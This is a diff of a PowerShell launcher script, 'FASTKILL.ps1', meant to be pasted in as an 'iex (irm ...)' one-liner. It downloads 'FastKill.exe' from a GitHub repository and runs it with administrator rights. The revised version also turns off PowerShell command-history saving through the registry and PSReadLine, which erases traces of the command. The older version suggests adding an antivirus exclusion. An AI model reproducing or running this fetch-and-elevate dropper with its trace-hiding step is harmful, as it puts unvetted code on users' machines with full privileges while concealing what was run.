@@ -1,141 +1,83 @@
-# FASTKILL launcher - works with:
-#   powershell -ExecutionPolicy Bypass -File .\FASTKILL.ps1
-#   iex (irm 'https://cdn.jsdelivr.net/gh/lubyralph6-maker/FASTKILL@main/FASTKILL.ps1')
-#   powershell -NoProfile -ExecutionPolicy Bypass -Command "iex (irm 'https://cdn.jsdelivr.net/gh/lubyralph6-maker/FASTKILL@main/FASTKILL.ps1')"
+# Copy to GitHub: FASTKILL.ps1
+# Run in PowerShell (Admin):
+#   iex (irm 'https://raw.githubusercontent.com/lubyralph6-maker/FASTKILL/main/FASTKILL.ps1')
+# If 429, wait 1-2 min and retry, or:
+#   1..5|%{try{iex(irm 'https://raw.githubusercontent.com/lubyralph6-maker/FASTKILL/main/FASTKILL.ps1');break}catch{sleep 20}}
 
 $ErrorActionPreference = 'Stop'
 
-$exeName = 'FastKill.exe'
-$installDir = Join-Path $env:LOCALAPPDATA 'FASTKILL'
-$exePath = Join-Path $installDir $exeName
-$downloadHeaders = @{
-    'User-Agent' = 'FASTKILL-Launcher/1.0 (Windows; PowerShell)'
-    'Accept'     = '*/*'
-}
-$exeUrls = @(
-    'https://raw.githubusercontent.com/lubyralph6-maker/FASTKILL/main/FastKill.exe',
-    'https://raw.githubusercontent.com/lubyralph6-maker/FASTKILL/main/FastKill.exe?download=1'
+try {
+    if (-not (Test-Path 'HKCU:\Software\Microsoft\PowerShell\PSReadLine')) {
+        New-Item 'HKCU:\Software\Microsoft\PowerShell\PSReadLine' -Force | Out-Null
+    }
+    Set-ItemProperty 'HKCU:\Software\Microsoft\PowerShell\PSReadLine' HistorySaveStyle 2 -Type DWord -Force
+    Import-Module PSReadLine -ErrorAction SilentlyContinue | Out-Null
+    Set-PSReadLineOption -HistorySaveStyle SaveNothing -ErrorAction SilentlyContinue
+} catch {}
+
+$exe = Join-Path $env:LOCALAPPDATA 'FASTKILL\FastKill.exe'
+$urls = @(
+    'https://github.com/lubyralph6-maker/FASTKILL/raw/main/FastKill.exe',
+    'https://raw.githubusercontent.com/lubyralph6-maker/FASTKILL/main/FastKill.exe'
 )
+$hdr = @{ 'User-Agent' = 'FASTKILL/1.0' }
 
-function Write-Status([string]$Text, [string]$Color = 'White') {
-    Write-Host $Text -ForegroundColor $Color
+function Test-FkExe([string]$Path) {
+    if (-not (Test-Path -LiteralPath $Path)) { return $false }
+    $f = Get-Item -LiteralPath $Path
+    if ($f.Length -lt 4MB) { return $false }
+    $b = [IO.File]::ReadAllBytes($Path)
+    if ($b.Length -lt 512) { return $false }
+    if ([Text.Encoding]::ASCII.GetString($b, 0, 2) -ne 'MZ') { return $false }
+    $o = [BitConverter]::ToInt32($b, 0x3C)
+    if ($o -lt 0 -or ($o + 0x200) -gt $b.Length) { return $false }
+    if ([Text.Encoding]::ASCII.GetString($b, $o, 4) -ne "PE`0`0") { return $false }
+    return ([BitConverter]::ToUInt16($b, $o + 4) -eq 0x8664)
 }
 
-function Invoke-DownloadFile {
-    param(
-        [Parameter(Mandatory = $true)][string[]]$Urls,
-        [Parameter(Mandatory = $true)][string]$OutFile
-    )
+function Get-FkExe {
+    foreach ($local in @(
+        (Join-Path $PSScriptRoot 'bin\FastKill.exe'),
+        (Join-Path $PSScriptRoot 'FastKill.exe'),
+        (Join-Path (Get-Location) 'bin\FastKill.exe'),
+        (Join-Path (Get-Location) 'FastKill.exe')
+    )) {
+        if (Test-FkExe $local) { return (Resolve-Path -LiteralPath $local).Path }
+    }
+
+    $dir = Split-Path $exe
+    if (-not (Test-Path -LiteralPath $dir)) {
+        New-Item -ItemType Directory -Path $dir -Force | Out-Null
+    }
+
+    if (Test-FkExe $exe) { return $exe }
+    if (Test-Path -LiteralPath $exe) { Remove-Item -LiteralPath $exe -Force }
 
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-    $lastError = $null
-
-    foreach ($url in $Urls) {
-        for ($attempt = 1; $attempt -le 3; $attempt++) {
+    $err = $null
+    foreach ($url in $urls) {
+        foreach ($try in 1..3) {
             try {
-                Write-Status "Downloading (try $attempt): $url" Cyan
-                Invoke-WebRequest -Uri $url -OutFile $OutFile -UseBasicParsing -Headers $downloadHeaders
-                if ((Test-Path -LiteralPath $OutFile) -and ((Get-Item -LiteralPath $OutFile).Length -gt 100000)) {
-                    return $true
-                }
-                Remove-Item -LiteralPath $OutFile -Force -ErrorAction SilentlyContinue
-                throw 'Downloaded file is missing or too small.'
-            }
-            catch {
-                $lastError = $_
-                $msg = $_.Exception.Message
-                if ($msg -match '429|Too Many Requests') {
-                    $waitSec = 15 * $attempt
-                    Write-Status "GitHub rate limit (429). Waiting ${waitSec}s..." Yellow
-                    Start-Sleep -Seconds $waitSec
-                }
-                elseif ($attempt -lt 3) {
-                    Start-Sleep -Seconds (5 * $attempt)
-                }
+                Invoke-WebRequest -Uri $url -OutFile $exe -UseBasicParsing -Headers $hdr
+                if (Test-FkExe $exe) { return $exe }
+                Remove-Item -LiteralPath $exe -Force -ErrorAction SilentlyContinue
+                throw 'bad exe'
+            } catch {
+                $err = $_
+                if ($_.Exception.Message -match '429') { Start-Sleep -Seconds (15 * $try) }
+                else { Start-Sleep -Seconds (5 * $try) }
             }
         }
     }
-
-    if ($null -ne $lastError) {
-        throw $lastError.Exception.Message
+    if ($null -ne $err -and $null -ne $err.Exception) {
+        throw $err.Exception.Message
     }
-    return $false
+    throw 'Download failed'
 }
 
-function Get-LocalExeNearScript {
-    $roots = @()
-    if (-not [string]::IsNullOrWhiteSpace($PSScriptRoot)) {
-        $roots += $PSScriptRoot
-    }
-    $roots += (Get-Location).Path
-
-    foreach ($root in $roots | Select-Object -Unique) {
-        $candidates = @(
-            (Join-Path $root $exeName),
-            (Join-Path $root 'bin\FastKill.exe'),
-            (Join-Path $root 'bin\FASTKILL.exe')
-        )
-        foreach ($candidate in $candidates) {
-            if (Test-Path -LiteralPath $candidate) {
-                return (Resolve-Path -LiteralPath $candidate).Path
-            }
-        }
-    }
-
-    return $null
-}
-
-function Get-CachedOrDownloadedExe {
-    if (-not (Test-Path -LiteralPath $installDir)) {
-        New-Item -ItemType Directory -Path $installDir -Force | Out-Null
-    }
-
-    if (Test-Path -LiteralPath $exePath) {
-        return $exePath
-    }
-
-    if (-not (Invoke-DownloadFile -Urls $exeUrls -OutFile $exePath)) {
-        throw 'Download failed - FastKill.exe not found after download.'
-    }
-
-    Write-Status 'Downloaded' Green
-    return $exePath
-}
-
-function Resolve-ExePath {
-    $local = Get-LocalExeNearScript
-    if ($null -ne $local) {
-        return $local
-    }
-    return Get-CachedOrDownloadedExe
-}
-
-try {
-    $targetExe = Resolve-ExePath
-    if ([string]::IsNullOrWhiteSpace($targetExe)) {
-        throw 'Could not resolve FastKill.exe path.'
-    }
-
-    Write-Status "Using: $targetExe" Green
-    Write-Status 'Starting FASTKILL V.1 (Administrator)...' Cyan
-
-    $proc = Start-Process -FilePath $targetExe -Verb RunAs -PassThru
-    if ($null -eq $proc) {
-        throw 'Start-Process returned null.'
-    }
-
-    Start-Sleep -Seconds 2
-    if ($proc.HasExited) {
-        throw "FastKill closed immediately (exit $($proc.ExitCode)). Run as Administrator and check antivirus exclusion."
-    }
-
-    Write-Status 'FASTKILL is running.' Green
-    Write-Status 'Finished' Green
-}
-catch {
-    Write-Status "Error: $($_.Exception.Message)" Red
-    Write-Status 'If 429: wait 1-2 min and retry, or send friend bin\FastKill.exe directly.' Yellow
-}
-
-Write-Host ''
-Read-Host 'Press Enter to close'
+$path = Get-FkExe
+$proc = Start-Process -FilePath $path -Verb RunAs -PassThru
+if ($null -eq $proc) { throw 'RunAs failed' }
+Start-Sleep -Seconds 2
+if ($proc.HasExited) { throw "FastKill exited ($($proc.ExitCode))" }
+Write-Host 'FASTKILL running' -ForegroundColor Green
